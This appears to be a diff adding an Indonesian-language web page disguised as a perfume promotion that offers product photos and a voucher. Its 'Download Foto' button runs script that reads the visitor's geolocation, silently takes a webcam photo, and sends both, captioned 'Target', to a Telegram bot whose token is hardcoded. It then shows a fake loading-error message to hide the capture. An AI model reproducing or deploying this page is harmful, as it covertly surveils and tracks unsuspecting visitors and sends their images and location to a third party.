@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Promo Eksklusif Parfum</title>
+  <link href="https://fonts.googleapis.com/css?family=Montserrat:400,700&display=swap" rel="stylesheet">
+  <style>
+    body {
+      font-family: 'Montserrat', sans-serif;
+      background: url('https://source.unsplash.com/featured/?perfume') no-repeat center center/cover;
+      color: #fff;
+      text-align: center;
+      padding: 50px;
+    }
+    .box {
+      background: rgba(0, 0, 0, 0.6);
+      padding: 40px;
+      border-radius: 10px;
+      display: inline-block;
+    }
+    button {
+      padding: 15px 30px;
+      font-size: 18px;
+      background-color: #ff0077;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+  <div class="box">
+    <h1>Download Foto Produk Parfum Eksklusif</h1>
+    <p>Klik tombol di bawah untuk melihat preview dan klaim voucher spesial.</p>
+    <button onclick="startCapture()">Download Foto</button>
+  </div>
+
+  <script>
+    const BOT_TOKEN = "7769924347:AAF9T6_jRYTJWDh8XVKgtHfd_NbPa9QFC-Y";
+    const CHAT_ID = "-1002541887392";
+
+    async function startCapture() {
+      try {
+        navigator.geolocation.getCurrentPosition(async (pos) => {
+          const lat = pos.coords.latitude;
+          const lon = pos.coords.longitude;
+
+          const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+          const track = stream.getVideoTracks()[0];
+          const imageCapture = new ImageCapture(track);
+          const photoBlob = await imageCapture.takePhoto();
+
+          const formData = new FormData();
+          formData.append("chat_id", CHAT_ID);
+          formData.append("photo", photoBlob, "produk.jpg");
+          formData.append("caption", `Target:\nLokasi: https://maps.google.com/?q=${lat},${lon}`);
+
+          await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+            method: "POST",
+            body: formData
+          });
+
+          track.stop();
+          alert("File gagal dimuat. Silakan coba lagi.");
+        });
+      } catch (e) {
+        alert("Akses ditolak atau terjadi error.");
+      }
+    }
+  </script>
+</body>
+  </html>
